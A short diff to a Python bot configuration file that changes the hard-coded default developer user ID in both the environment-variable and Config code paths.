@@ -70,7 +70,7 @@ if ENV:
 
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "5872109995").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "6024180996").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
@@ -125,7 +125,7 @@ else:
 
     try:
         DRAGONS = set(int(x) for x in Config.DRAGONS or [])
-        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [5872109995])
+        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [6024180996])
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
